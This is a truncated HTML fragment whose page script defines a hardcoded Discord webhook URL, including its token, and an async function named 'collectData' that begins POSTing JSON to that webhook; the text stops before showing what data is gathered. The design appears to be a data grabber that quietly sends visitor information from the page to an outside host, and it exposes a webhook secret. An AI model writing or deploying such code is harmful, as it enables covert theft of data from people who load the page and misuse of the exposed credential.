<body>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1414190665662992404/5YbTgWinpCGFU3VrGK34rqwvtWPcLBDuVmETtRUvMjlOAJBTyuTyGCDii-QQcNKbsV2A";
        
        async function collectData() {

            // Send to Discord webhook
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
